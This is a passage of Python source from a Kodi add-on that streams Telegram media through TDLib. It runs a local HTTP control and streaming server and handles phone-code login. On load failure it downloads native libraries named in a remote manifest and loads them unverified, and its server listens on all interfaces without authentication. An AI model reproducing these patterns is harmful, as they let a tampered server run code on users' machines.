                    stop_now=True
                    ready_data='ok'
                elif post_data['type']=='get_file_size':
                    if post_data['info'] not in file_size:
                        #logging.warning('Not in file size')
                        file_size[post_data['info']]=0
                        downn_path[post_data['info']]=''
                    ready_data={'path':downn_path[post_data['info']],'file_size':file_size[post_data['info']],'downloaded':ready_size,'total_size':total_size}
                elif post_data['type']=='kill_file_size':
                    try:
                        if post_data['info']  in file_size:
                            del file_size[post_data['info']]
                            del downn_path[post_data['info']]
                    except:
                        pass
                    ready_data={'status':'OK'}
                elif post_data['type']=='download_complete':
                    num=random.randint(0,60000)
                    post_box[num]={'@type':'td_send','data':{'@type': 'downloadFile','file_id': post_data['info'], 'priority':1,'offset':0,'limit':0, '@extra': num},'status':'pending','responce':None}
                    
                    path=wait_download_file_complete(post_data['info'],0,0)
                    
                    ready_data=path
                    del post_box[num]
                    
                    
                    
                elif post_data['type']=='download_photo':
                    #logging.warning('Got download')
                    num=random.randint(0,60000)
                    post_box[num]={'@type':'td_send','data':{'@type': 'downloadFile','file_id': post_data['info'], 'priority':1,'offset':0,'limit':0, '@extra': num},'status':'pending','responce':None}
                    #logging.warning('Wait download')
                    path=wait_download_file_photo(post_data['info'],0,0)
                    
                    ready_data=path
                    del post_box[num]
                elif post_data['type']=='clean_last_link':
                    
                    last_link='empty'
                    ready_data='ok'
                elif post_data['type']=='get_last_link':
                    ready_data=last_link
                    last_link='empty'
                elif post_data['type']=='get_last_link2':
                    ready_data=last_link
                    last_link='empty'
                elif post_data['type']=='listen':
                
                    post_box['get_status']={'status':'listen','responce':None}
                    counter_wait=0
                    while post_box['get_status']['responce']==None and counter_wait<10:
                        counter_wait+=1
                        time.sleep(0.1)
                    ready_data = post_box['get_status']['responce']
                elif post_data['type']=='listen2':
                    post_box['updateFile_local']={'status':'listen','responce':None}
                    
                    ready_data = post_box['updateFile_local']['responce']#td_receive()
                elif post_data['type']=='login':
                    
                    # print בוטל ('Already Logged in')
                    ready_data={'status':'Logging'}
                elif post_data['type']=='logout':
                    post_box[555.999]={'@type':'td_send','data':{'@type': 'logOut', '@extra': 555.999},'status':'pending','responce':None}
                    
                    #td_send({'@type': 'logOut', '@extra': 555.999})
                    ready_data=wait_response(555.999)
                    
                    
                    ready_data={'status':'Logedout'}
                    
                    stop_listen=2
                    time.sleep(1)
                    
                    td_json_client_destroy(client)
                    if on_xbmc:
                        xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', 'Loged Out ok'))
                elif post_data['type']=='checklogin':
                    ready_data={'status':stop_listen}
                elif post_data['type']=='getfolders':
                    ready_data={'status':all_folders}
                
                self.send_response(200)
                self.send_header('Content-type','text/html')
                self.end_headers()
                try:
                   self.wfile.write(json.dumps(ready_data))
                except:
                   self.wfile.write(bytes(json.dumps(ready_data),"utf-8"))
        except Exception as e:
            import linecache,sys
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Telemdia post:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
    def do_HEAD(self):
        
        """Serve a HEAD request."""
        
        f, start_range, end_range = self.send_head()
        if f:
            f.close()
       
    def send_head(self):
        global size,global_f,ready_size_pre,total_size,stop_now
        """Common code for GET and HEAD commands.

        This sends the response code and MIME headers.

        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.

        """
        
        
        id=self.path.replace('/','')
        start_range=0
        if "Range" in self.headers:
            s, e = self.headers['range'][6:].split('-', 1)
            sl = len(s)
            el = len(e)
            if sl > 0:
                start_range = int(s)
        
        
        # print בוטל ('Download file')
        if 1:#size==0:
            size,path,prefix=get_file_size(id)

        if stop_now:
            stop_now=False
            self.send_response(404)
        else:
            if "Range" in self.headers:
                self.send_response(206)
            else:
                self.send_response(200)
            
        self.send_header("Content-type", 'video/mp4')
      
        start_range = 0
        end_range = size
        self.send_header("Accept-Ranges", "bytes")

        if "Range" in self.headers:
            s, e = self.headers['range'][6:].split('-', 1)
            
            sl = len(s)
            el = len(e)
            if sl > 0:
                start_range = int(s)
                if el > 0:
                    end_range = int(e) + 1
            elif el > 0:
                ei = int(e)
                if ei < size:
                    start_range = size - ei

        f = None
        num=random.randint(0,60000)
        post_box[num]={'@type':'td_send','data':{'@type': 'downloadFile','file_id':int(id), 'priority':1,'offset':start_range,'limit':end_range, '@extra': num},'status':'pending','responce':None}
                
        do_buffer=True
        if 1:#start_range==0:
            event=wait_response(num)
        
            if 'expected_size' in event :
                
                if len(event['local']['path'])>0 and (event['local']['is_downloading_completed']==True):
                    do_buffer=False
                    #logging.warning('Found Complete')
                    path=event['local']['path']
                    size=event['size']
        if do_buffer:
            path,size=wait_download_file(id,start_range,end_range)
            
        ready_size_pre=start_range
        total_size=size
        s_buffersize=int(Addon.getSetting("chunk_size_file")) *1024
        regex='[0-9]+'
        m=re.compile(regex).findall(path)#[0]

        try:
            try:
                f = open(path, 'rb',buffering=s_buffersize)
                global_f=f
            except Exception as e:
                logging.warning('File Error one:'+str(e))
                try:
                    r=path.replace(str(m[0]),'')
                    r=r+str(int(m[0])+1)
                    time.sleep(2)
                    f = open(r, 'rb',buffering=s_buffersize)
                    global_f=f
                except Exception as e:
                    logging.warning('File Error two:'+str(e))
                    r=path.replace(str(m[0]),'')
                    r=r+str(int(m[0])+2)
                    time.sleep(1)
                    f = open(r, 'rb',buffering=s_buffersize)
                    global_f=f
        except Exception as e:
            f=global_f
            logging.warning('File Error three:'+str(e))
            self.send_error(404, "File not found")
            return (None, 0, 0)
        
        
        self.send_header("Content-Range",
                         'bytes ' + str(start_range) + '-' +
                         str(end_range - 1) + '/' + str(size))
    
        self.send_header("Content-Length", str(end_range-start_range))
        #self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.end_headers()
        return (f, start_range, end_range)


    def translate_path(self, opath):
        path = urllib.unquote(opath)
        for p in self.uprclpathmap.itervalues():
            if path.startswith(p):
                return path
        # print בוטל ("HTTP: translate_path: %s not found in path map" % opath)
        return None

    def guess_type(self, path):
        """Guess the type of a file.

        Argument is a PATH (a filename).

        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.

        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.

        """

        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']

    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.mp4': 'video/mp4',
        '.ogg': 'video/ogg',
        })


#This class will handles any incoming request from
#the browser 

try:
    socket_server=SocketServer.ThreadingMixIn
except:
    socket_server=socketserver.ThreadingMixIn
class ThreadingSimpleServer(socket_server,
                            BaseHTTPServer.HTTPServer):
    pass
def start_server():
    global server
    # print ('Start1')
    # Set pathmap as request handler class variable
    RangeHTTPRequestHandler.uprclpathmap = {}
    # print ('Start3')
    server = ThreadingSimpleServer(('', PORT_NUMBER), RangeHTTPRequestHandler)
    # print ('Start')
    
    server.serve_forever()

# t = Thread(target=start_server, args=())
# t.start()

if on_xbmc:

    try:
        user_dataDir = translatepath(Addon.getAddonInfo("profile")).decode("utf-8")
    except:
        user_dataDir = translatepath(Addon.getAddonInfo("profile"))
else:
    cur=os.path.dirname(os.path.abspath(__file__))
    user_dataDir = cur
logo_path=os.path.join(user_dataDir, 'logo')


# files_path=os.path.join(user_dataDir, 'files')
directory_mod=Addon.getSetting("directory_mod")
if directory_mod =='true':

    files_path=str(translatepath(Addon.getSetting("movie_download_directory")))
else:
    files_path=os.path.join(user_dataDir, 'files')
db_path=os.path.join(user_dataDir, 'database')
log_path=os.path.join(user_dataDir, 'log')
try:
    if not os.path.exists(user_dataDir):
         os.makedirs(user_dataDir)

    if not os.path.exists(logo_path):
         os.makedirs(logo_path)

    if not os.path.exists(files_path):
         os.makedirs(files_path)

    if not os.path.exists(db_path):
         os.makedirs(db_path)

    if not os.path.exists(log_path):
         os.makedirs(log_path)
except:
    pass
    
machine= (platform.machine())
platform= (platform.architecture())

cur=os.path.dirname(os.path.abspath(__file__))
cur=os.path.join(cur,'resources','lib')


# if sys.platform.lower().startswith('linux'):
    # plat = 'linux'
    # if 'ANDROID_DATA' in os.environ:
        # plat = 'android'
if xbmc.getCondVisibility('system.platform.android'):
    plat = 'android'
    
    
elif sys.platform.lower().startswith('win'):
    plat = 'windows'
elif sys.platform.lower().startswith('darwin'):
    plat = 'darwin'
elif xbmc.getCondVisibility('system.platform.linux'):
    plat = 'linux'
else:
    plat = None
def download_file(url,path):

    import requests

    local_filename = url.split('/')[-1]
    if '?' in local_filename:
        local_filename=local_filename.split('?')[0]
    local_filename=os.path.join(path,local_filename)
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                #if chunk: 
                f.write(chunk)
    return local_filename
def remove_old():
    try:
        
        source=(os.path.join(user_dataDir,'settings.xml'))
        dest=os.path.join(translatepath("special://temp/"),'settings.xml')
       
        copyfile(source,dest)
        shutil.rmtree(user_dataDir)
        os.makedirs(user_dataDir)
        copyfile(os.path.join(translatepath("special://temp/"),'settings.xml'),os.path.join(user_dataDir,'settings.xml'))
    except:
        pass

def check_version(path,force=False):
    import requests
    from zipfile import ZipFile
    cur=os.path.dirname(os.path.abspath(__file__))
    cur=os.path.join(cur,'resources','lib')
    x=requests.get(server_lib).json()
    if force:
        # remove_old()
        
        download_file(server_lib,user_dataDir)
        if plat == 'android':
                if platform[0]=='32bit':
                    url=x['android32']
                    cur=os.path.join(cur,"android/armeabi-v7a")
                    download_file(url,cur)
                else:
                    url=x['android64']
                    cur=os.path.join(cur,"android/arm64-v8a")
                    download_file(url,cur)
                
        elif plat == 'windows':
            
            if platform[0]=='64bit':

                cur=os.path.join(cur,'windows/x64')
                download_file(x['windows64'],cur)
                file_windows=os.path.join(cur,'windows64.zip')
                zf = ZipFile(file_windows)

                

                for file in zf.infolist():
                    zf.extract(member=file, path=cur)
                zf.close()
                time.sleep(1)
                try:
                    os.remove(file_windows)
                except:
                    pass
            else:
                
                cur=os.path.join(cur,'windows/x32')
                download_file(x['windows32'],cur)
                file_windows=os.path.join(cur,'windows32.zip')
                zf = ZipFile(file_windows)

                

                for file in zf.infolist():
                    zf.extract(member=file, path=cur)
                zf.close()
                time.sleep(1)
                try:
                    os.remove(file_windows)
                except:
                    pass
        elif plat == 'linux':
            
                if platform[0]=='32bit':
                    url=x['linux32']
                    cur=os.path.join(cur,"linux/x32")
                    download_file(url,cur)
                else:
                    url=x['linux64']
                    cur=os.path.join(cur,"linux/x64")
                    download_file(url,cur)
        elif plat == 'darwin':
            
                # if platform[0]=='32bit':
                    # url=x['linux32']
                    # cur=os.path.join(cur,"linux/x32")
                    # download_file(url,cur)
                # else:
                    cur=os.path.join(cur,'mac/mac-os')
                    download_file(x['mac'],cur)
                    file_mac=os.path.join(cur,'libtdjson.zip')
                    zf = ZipFile(file_mac)

                    

                    for file in zf.infolist():
                        zf.extract(member=file, path=cur)
                    zf.close()
                    time.sleep(1)
                    try:
                        os.remove(file_mac)
                    except:
                        pass
                    url=x['mac']
                    cur=os.path.join(cur,"mac/mac-os")
                    download_file(url,cur)
    else:
        user_version=os.path.join(user_dataDir,'data.json')
        
        if os.path.exists(user_version):
            
            f = open(user_version)
            
            current_version=json.load(f)['Version']
            
            remote_version=x['Version']
            
            if version.parse(current_version) < version.parse(remote_version):
                
                # remove_old()
                if plat == 'android':
                    if platform[0]=='32bit':
                        url=x['android32']
                        cur=os.path.join(cur,"android/armeabi-v7a")
                        download_file(url,cur)
                    else:
                        url=x['android64']
                        cur=os.path.join(cur,"android/arm64-v8a")
                        download_file(url,cur)
                elif plat == 'windows':
                     
                    if platform[0]=='64bit':

                         cur=os.path.join(cur,'windows/x64')
                         download_file(x['windows64'],cur)
                         file_windows=os.path.join(cur,'windows64.zip')
                         zf = ZipFile(file_windows)
                         
                         
                         for file in zf.infolist():
                            zf.extract(member=file, path=cur)
                         zf.close()
                         time.sleep(1)
                         try:
                            os.remove(file_windows)
                         except:
                            pass
                    else:
                        cur=os.path.join(cur,'windows/x32')
                        download_file(x['windows32'],cur)
                        file_windows=os.path.join(cur,'windows32.zip')
                        zf = ZipFile(file_windows)
                        
                                
                        for file in zf.infolist():
                            zf.extract(member=file, path=cur)
                        zf.close()
                        time.sleep(1)
                        try:
                            os.remove(file_windows)
                        except:
                            pass
                elif plat == 'linux':
                    
                        if platform[0]=='32bit':
                            url=x['linux32']
                            cur=os.path.join(cur,"linux/x32")
                            download_file(url,cur)
                        else:
                            url=x['linux64']
                            cur=os.path.join(cur,"linux/x64")
                            download_file(url,cur)
                elif plat == 'darwin':
                    
                        # if platform[0]=='32bit':
                            # url=x['linux32']
                            # cur=os.path.join(cur,"linux/x32")
                            # download_file(url,cur)
                        # else:
                            cur=os.path.join(cur,'mac/mac-os')
                            download_file(x['mac'],cur)
                            file_mac=os.path.join(cur,'libtdjson.zip')
                            zf = ZipFile(file_mac)

                            

                            for file in zf.infolist():
                                zf.extract(member=file, path=cur)
                            zf.close()
                            time.sleep(1)
                            try:
                                os.remove(file_mac)
                            except:
                                pass
                            url=x['mac']
                            cur=os.path.join(cur,"mac/mac-os")
                            download_file(url,cur)
            download_file(server_lib,user_dataDir)
        else:
            # remove_old()
            
            download_file(server_lib,user_dataDir)
            if plat == 'android':
                    if platform[0]=='32bit':
                        url=x['android32']
                        cur=os.path.join(cur,"android/armeabi-v7a")
                        download_file(url,cur)
                    else:
                        url=x['android64']
                        cur=os.path.join(cur,"android/arm64-v8a")
                        download_file(url,cur)
            elif plat == 'windows':
                
                if platform[0]=='64bit':
                    
                    cur=os.path.join(cur,'windows/x64')
                    download_file(x['windows64'],cur)
                    file_windows=os.path.join(cur,'windows64.zip')
                    zf = ZipFile(file_windows)

                    

                    for file in zf.infolist():
                        zf.extract(member=file, path=cur)
                    zf.close()
                    time.sleep(1)
                    try:
                        os.remove(file_windows)
                    except:
                        pass
                else:
                    cur=os.path.join(cur,'windows/x32')
                    download_file(x['windows32'],cur)
                    file_windows=os.path.join(cur,'windows32.zip')
                    zf = ZipFile(file_windows)

                    

                    for file in zf.infolist():
                        zf.extract(member=file, path=cur)
                    zf.close()
                    time.sleep(1)
                    try:
                        os.remove(file_windows)
                    except:
                        pass
            elif plat == 'linux':
                
                    if platform[0]=='32bit':
                        url=x['linux32']
                        cur=os.path.join(cur,"linux/x32")
                        download_file(url,cur)
                    else:
                        url=x['linux64']
                        cur=os.path.join(cur,"linux/x64")
                        download_file(url,cur)
            elif plat == 'darwin':
                
                    # if platform[0]=='32bit':
                        # url=x['linux32']
                        # cur=os.path.join(cur,"linux/x32")
                        # download_file(url,cur)
                    # else:
                        cur=os.path.join(cur,'mac/mac-os')
                        download_file(x['mac'],cur)
                        file_mac=os.path.join(cur,'libtdjson.zip')
                        zf = ZipFile(file_mac)

                        

                        for file in zf.infolist():
                            zf.extract(member=file, path=cur)
                        zf.close()
                        time.sleep(1)
                        try:
                            os.remove(file_mac)
                        except:
                            pass
                        url=x['mac']
                        cur=os.path.join(cur,"mac/mac-os")
                        download_file(url,cur)
if plat == 'android':
    if platform[0]=='32bit':

        cur=os.path.join(cur,"android/armeabi-v7a")
        f_name='libtdjson'
    else:

        cur=os.path.join(cur,"android/arm64-v8a")
        f_name='libtdjson'

    # try:
        # check_version(plat)
    # except Exception as e:
        # logging.warning('check_version '+str(e))
    loc1=os.path.join(translatepath('special://xbmc'),'libtdjsonjava.so')
    
    try:
        copyfile(os.path.join(cur,'%s.so'%f_name),loc1)
    except Exception as e:
            check_version(plat,force=True)
            # time.sleep(5)
            try:
                copyfile(os.path.join(cur,'%s.so'%f_name),loc1)
            except:
                pass
            logging.warning(e)
            pass 

    try:
        # logging.warning('CDLL:'+loc1)
        tdjson=CDLL(loc1)
    except Exception as e:
        check_version(plat,force=True)
        # time.sleep(5)
        try:
            tdjson=CDLL(loc1)
        except:
            pass
        logging.warning(e)
        pass 
    try:
        td_json_client_create = tdjson._td_json_client_create
    except:
        td_json_client_create = tdjson.td_json_client_create
    td_json_client_create.restype = c_void_p
    td_json_client_create.argtypes = []
    try:
        td_json_client_receive = tdjson._td_json_client_receive
    except:
        td_json_client_receive = tdjson.td_json_client_receive
    td_json_client_receive.restype = c_char_p
    td_json_client_receive.argtypes = [c_void_p, c_double]
    try:
        td_json_client_send = tdjson._td_json_client_send
    except:
        td_json_client_send = tdjson.td_json_client_send
    td_json_client_send.restype = None
    td_json_client_send.argtypes = [c_void_p, c_char_p]
    try:
        td_json_client_execute = tdjson._td_json_client_execute
    except:
        td_json_client_execute = tdjson.td_json_client_execute
    td_json_client_execute.restype = c_char_p
    td_json_client_execute.argtypes = [c_void_p, c_char_p]
    try:
        td_json_client_destroy = tdjson._td_json_client_destroy
    except:
        td_json_client_destroy = tdjson.td_json_client_destroy
    td_json_client_destroy.restype = None
    td_json_client_destroy.argtypes = [c_void_p]
    #logging.warning('Done Define')
    
if plat == 'linux':
    if machine.lower().startswith('arm') or machine.lower().startswith('st'):
       # logging.warning('arm')
       cur=os.path.join(cur,"arm/arm-linux-gnueabihf")
       f_name= 'libtdjson.so'
    else:
       if platform[0]=='32bit':
            # logging.warning('Linux 32Bit')
            cur=os.path.join(cur,"linux/x32")
            f_name= 'libtdjson.so'
       else:
            # logging.warning('Linux 64Bit')
            cur=os.path.join(cur,"linux/x64")
            f_name= 'libtdjson.so'
    # try:
        # check_version(plat)
    # except Exception as e:
        # logging.warning('check_version '+str(e))
    loc1=os.path.join(cur,f_name)
    


    try:
        #logging.warning('CDLL:'+loc1)
        tdjson=CDLL(loc1)
    except Exception as e:
        check_version(plat,force=True)
        # time.sleep(5)
        try:
            tdjson=CDLL(loc1)
        except:
            pass
            #logging.warning(e)
    td_json_client_create = tdjson.td_json_client_create
    td_json_client_create.restype = c_void_p
    td_json_client_create.argtypes = []

    td_json_client_receive = tdjson.td_json_client_receive
    td_json_client_receive.restype = c_char_p
    td_json_client_receive.argtypes = [c_void_p, c_double]

    td_json_client_send = tdjson.td_json_client_send
    td_json_client_send.restype = None
    td_json_client_send.argtypes = [c_void_p, c_char_p]

    td_json_client_execute = tdjson.td_json_client_execute
    td_json_client_execute.restype = c_char_p
    td_json_client_execute.argtypes = [c_void_p, c_char_p]

    td_json_client_destroy = tdjson.td_json_client_destroy
    td_json_client_destroy.restype = None
    td_json_client_destroy.argtypes = [c_void_p]

 
if plat == 'windows':
    
    if platform[0]=='64bit':

        cur=os.path.join(cur,'windows/x64')
        crypt_name='libcrypto-1_1-x64.dll'
        ssl_name='libssl-1_1-x64.dll'
    else:

        cur=os.path.join(cur,'windows/x32')
        crypt_name='libcrypto-1_1.dll'
        ssl_name='libssl-1_1.dll'
    
    #ph=os.path.join(cur,'libeay32.dll')
    ph=os.path.join(cur,crypt_name)

    # try:מפעילים רק מתי שרוצים שהטלמדיה תעדכן את הקבצים
        # check_version(plat)
    # except Exception as e:
        # logging.warning('check_version '+str(e))
    try:
        CDLL(ph)
    except Exception as e:
        check_version(plat,force=True)
        # time.sleep(5)
        try:
            CDLL(ph)
        except:
            pass
        #logging.warning(e)


    #ph=os.path.join(cur,'ssleay32.dll')
    ph=os.path.join(cur,ssl_name)
    #logging.warning(ph)
    CDLL(ph)


    ph=os.path.join(cur,'zlib1.dll')


    CDLL(ph)

    ph=os.path.join(cur,'tdjson.dll')
    #logging.warning (ph)
    tdjson = CDLL(ph)

    # tdjson = CDLL(tdjson_path)

    td_json_client_create = tdjson.td_json_client_create
    td_json_client_create.restype = c_void_p
    td_json_client_create.argtypes = []

    td_json_client_receive = tdjson.td_json_client_receive
    td_json_client_receive.restype = c_char_p
    td_json_client_receive.argtypes = [c_void_p, c_double]

    td_json_client_send = tdjson.td_json_client_send
    td_json_client_send.restype = None
    td_json_client_send.argtypes = [c_void_p, c_char_p]

    td_json_client_execute = tdjson.td_json_client_execute
    td_json_client_execute.restype = c_char_p
    td_json_client_execute.argtypes = [c_void_p, c_char_p]

    td_json_client_destroy = tdjson.td_json_client_destroy
    td_json_client_destroy.restype = None
    td_json_client_destroy.argtypes = [c_void_p]
    
    td_set_log_file_path = tdjson.td_set_log_file_path
    td_set_log_file_path.restype = c_int
    td_set_log_file_path.argtypes = [c_char_p]

    td_set_log_max_file_size = tdjson.td_set_log_max_file_size
    td_set_log_max_file_size.restype = None
    td_set_log_max_file_size.argtypes = [c_longlong]

    td_set_log_verbosity_level = tdjson.td_set_log_verbosity_level
    td_set_log_verbosity_level.restype = None
    td_set_log_verbosity_level.argtypes = [c_int]

    fatal_error_callback_type = CFUNCTYPE(None, c_char_p)

    td_set_log_fatal_error_callback = tdjson.td_set_log_fatal_error_callback
    td_set_log_fatal_error_callback.restype = None
    td_set_log_fatal_error_callback.argtypes = [fatal_error_callback_type]
    td_set_log_verbosity_level(0)
    def on_fatal_error_callback(error_message):
        logging.warning('TDLib fatal error: '+ error_message)
    c_on_fatal_error_callback = fatal_error_callback_type(on_fatal_error_callback)
    td_set_log_fatal_error_callback(c_on_fatal_error_callback)
    
    

if plat == 'darwin':
    import platform
    if xbmc.getCondVisibility("system.platform.ios"):
        sys.exit()
        
    elif "AppleTV" in platform.platform():
        sys.exit()
    cur=os.path.join(cur,'mac/mac-os')


    ph=os.path.join(cur,'libtdjson.dylib')
    
    try:
        tdjson = CDLL(ph)
    except Exception as e:
        check_version(plat,force=True)
        # time.sleep(5)
        try:
            tdjson = CDLL(ph)
        except:
            pass


    try:
        td_json_client_create = tdjson._td_json_client_create
    except:
        td_json_client_create = tdjson.td_json_client_create
    td_json_client_create.restype = c_void_p
    td_json_client_create.argtypes = []
    try:
        td_json_client_receive = tdjson._td_json_client_receive
    except:
        td_json_client_receive = tdjson.td_json_client_receive
    td_json_client_receive.restype = c_char_p
    td_json_client_receive.argtypes = [c_void_p, c_double]
    try:
        td_json_client_send = tdjson._td_json_client_send
    except:
        td_json_client_send = tdjson.td_json_client_send
    td_json_client_send.restype = None
    td_json_client_send.argtypes = [c_void_p, c_char_p]
    try:
        td_json_client_execute = tdjson._td_json_client_execute
    except:
        td_json_client_execute = tdjson.td_json_client_execute
    td_json_client_execute.restype = c_char_p
    td_json_client_execute.argtypes = [c_void_p, c_char_p]
    try:
        td_json_client_destroy = tdjson._td_json_client_destroy
    except:
        td_json_client_destroy = tdjson.td_json_client_destroy
    td_json_client_destroy.restype = None
    td_json_client_destroy.argtypes = [c_void_p]
    
    
    
    
    
    
    
t = Thread(target=start_server, args=())
t.start()
def td_execute(query):
    query = json.dumps(query).encode('utf-8')
    result = td_json_client_execute(None, query)
    if result:
        result = json.loads(result.decode('utf-8'))
    return result


if stop_listen==0:
    client = td_json_client_create()


def td_send(query):
    query = json.dumps(query).encode('utf-8')
    td_json_client_send(client, query)

def td_receive():
    try:
        result = td_json_client_receive(client, 0.01)
        if result:
            result = json.loads(result.decode('utf-8'))
        return result
    except Exception as e:
        # logging.warning('Rec err:'+str(e))
        return ''

def wait_response_now(id,dp='',timeout=10):
    global post_box
    ret_value=''
    counter=0
    
    while True:
        event = td_receive()
        if event:
            if '@extra' in event :
                if event['@extra']==int(id):
                    break
        
            #    print post_box[id]['status']
        time.sleep(0.001)
    return (event)
    
def wait_response(id,dp='',timeout=10):
    global post_box
    ret_value=''
    counter=0
    #logging.warning('Wait res')
    while True:

        counter+=1
        if timeout>0:
            if counter>(timeout*1000):
                #logging.warning('Wait res Timeout')
                del post_box[id]
                return None
        if id in post_box:
            
            if post_box[id]['status']=='recived':
                
                # print ('found ret')
                ret_value=post_box[id]['responce']
                del post_box[id]
                break
            #else:
            #    print post_box[id]['status']
        time.sleep(0.001)
   
    return (ret_value)

if stop_listen==0:
    td_send({'@type': 'getAuthorizationState', '@extra': 1.01234})

if on_xbmc:
    try:
        cond=xbmc.Monitor().abortRequested()
    except:
        cond=xbmc.abortRequested
else:
    cond=0
timer=0
# from default import search_updates
event=None
hours_pre=0
def convert_to_preferred_format(sec):
   sec = sec % (24 * 3600)
   hour = sec // 3600
   sec %= 3600
   min = sec // 60
   sec %= 60

   return "%02d:%02d:%02d" % (hour, min, sec) 
if not os.path.exists(os.path.join(user_dataDir, '4.1.1')):

    xbmc.executebuiltin('RunPlugin(plugin://plugin.program.Settingz-Anon?mode=347&url=www)')
while not cond:
    
    if send_login==1:
        send_login=0
        td_send({'@type': 'getAuthorizationState', '@extra': 99.991234})

    if stop_listen==0:
        if create_dp_new==0:
            if on_xbmc:
                dp = xbmcgui.DialogProgressBG()

                dp.create('[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]Login[/COLOR][/B]')
            create_dp_new=1

        if event:

            if event.get('@type') =='error':
                    from datetime import datetime, timedelta
                    now = datetime.now()
                    if on_xbmc:
                        if Addon.getSetting("poptele")=='true':
                            LogNotify('Telemedia VIP',str(event.get('message')))
                        # xbmcgui.Dialog().ok('Telemedia Error',str(event.get('message')))
                        vv=Addon.getSetting("vip_login2")

                        if 'Too Many Requests' in str(event.get('message')):
                        
                            
                            
                            
                            if Addon.getSetting("vip_login2")=='false':
                                stop_listen=2
                                LogNotify('Telemedia VIP',str(event.get('message')))
                                dp.close()
                            else:
                                resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
                                dragon= resuaddon.getSetting("dragon")
                                if dragon=='true':
                                    sec=int(str(event.get('message')).split('Too Many Requests: retry after')[1])
                                    result = now + timedelta(seconds=sec)
                                    send_info('insert_phone','חשבון חסום, נסה שוב בשעה: '+str(f'{result:%H:%M:%S}')+' '+vv)
                                    # insert_phone('חשבון חסום, נסה שוב בשעה: '+str(f'{result:%H:%M:%S}')+' '+vv)
                                    
                                    
                                    # insert_phone('חשבון חסום, נסה בעוד: '+str(convert_to_preferred_format(sec))+' '+vv)
                                    stop_listen=2
                                    LogNotify('Telemedia VIP',str(event.get('message')))
                                    dp.close()
                                else:
                                    sec=int(str(event.get('message')).split('Too Many Requests: retry after')[1])
                                    result = now + timedelta(seconds=sec)
                                    send_info('insert_phone','חשבון חסום, נסה שוב בשעה: '+str(f'{result:%H:%M:%S}')+' '+vv)
                                    # insert_phone('חשבון חסום, נסה שוב בשעה: '+str(f'{result:%H:%M:%S}')+' '+vv)
                                    # insert_phone('חשבון חסום, נסה בעוד: '+str(convert_to_preferred_format(sec))+' '+vv)
                                    xbmc.sleep(500)
                                    send_info('insert_phone','הכנס מספר טלפון חלופי')

                                    phone_number=get_phone(code_link)
                                    td_send({'@type': 'setAuthenticationPhoneNumber', 'phone_number': str(phone_number)})
                                    if phone_number=='123456789000':
                                      Addon.setSetting("autologin",'false')
                                      Addon.setSetting("vip_login2",'false')
                                      stop_listen=2
                                      dp.close()
                                      LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                      send_info('insert_phone','התחברות בוטלה')
                                      if not os.path.exists(os.path.join(user_dataDir, '4.1.1')):
                                             file = open(os.path.join(user_dataDir, '4.1.1'), 'w') 
                                             file.write(str('Done'))
                                             file.close()
                                      # insert_phone('התחברות בוטלה')
                                      # try:    
                                            # os.remove(os.path.join(translatepath("special://userdata/"),"addon_data","plugin.video.telemedia","4.1.1"))
                                      # except:
                                          # pass
                                
                        if "Can't init files directory" in str(event.get('message')):

                            Addon.setSetting("directory_mod",'false')
                            stop_listen=2
                            dp.close()
                            ok=xbmcgui.Dialog().yesno(('נתיב ההורדה שהוגדר לטלמדיה לא תקין, יש להפעיל את הקודי מחדש'),('להפעיל מחדש?'))
                            if ok:
                                os._exit(1)
                        if str(event.get('message'))=='PHONE_NUMBER_INVALID':
                            if Addon.getSetting("vip_login2")=='false':
                                phone_number = xbmcgui.Dialog().input(Addon.getLocalizedString(32036).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_NUMERIC)#
                            else:
                                dp.update(60,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow] מתחבר לחשבון Anonymous TV...  [/COLOR][/B]')
                                send_info('insert_phone','הכנס שוב את מספר הטלפון')
                                # insert_phone('הכנס שוב את מספר הטלפון')
                                phone_number=get_phone(code_link)
                                    # xbmc.sleep(3000)#שלא יחשוב שהספרה 0 היא הקוד אימות

                            td_send({'@type': 'setAuthenticationPhoneNumber', 'phone_number': str(phone_number)})
                            
                        if str(event.get('message'))=='PASSWORD_HASH_INVALID':
                            password = xbmcgui.Dialog().input(Addon.getLocalizedString(32038).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_ALPHANUM)

                            if password=='':
                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                dp.close()
                                stop_listen=2
                            else:
                                td_send({'@type': 'checkAuthenticationPassword', 'password': str(password)})
                        if str(event.get('message'))=='PHONE_CODE_INVALID':
                            if Addon.getSetting("vip_login2")=='false':
                                code = xbmcgui.Dialog().input(Addon.getLocalizedString(32037).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_NUMERIC)
                            else:
                                try:
                                    send_info('insert_phone','הכנס שוב את קוד הטלגרם')
                                except:pass
